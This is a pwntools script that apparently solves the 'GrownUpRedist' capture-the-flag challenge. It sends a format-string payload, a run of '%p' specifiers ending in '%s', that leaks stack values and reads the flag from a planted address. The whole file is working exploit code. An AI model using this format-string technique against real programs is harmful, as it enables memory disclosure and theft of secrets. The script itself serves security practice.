from pwn import *
import re

#context.log_level = 'debug'


io = process('./GrownUpRedist')
#io = remote('svc.pwnable.xyz',30004)


flag= 0x601080
io.sendafter(b':',b'Y'*8 + p32(flag))

payload = b'AAAAAAAA'
payload += b'%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %s'
payload += b'A' * (0x80 - len(payload))

io.sendlineafter(b':',payload)
io.recv()
flag = io.readS()
io.close()
flag = re.search(r'FLAG{.*}', flag).group(0)
print(flag)

## 0x601080 --> "FLAG{_the_real_flag_will_be_here_}"
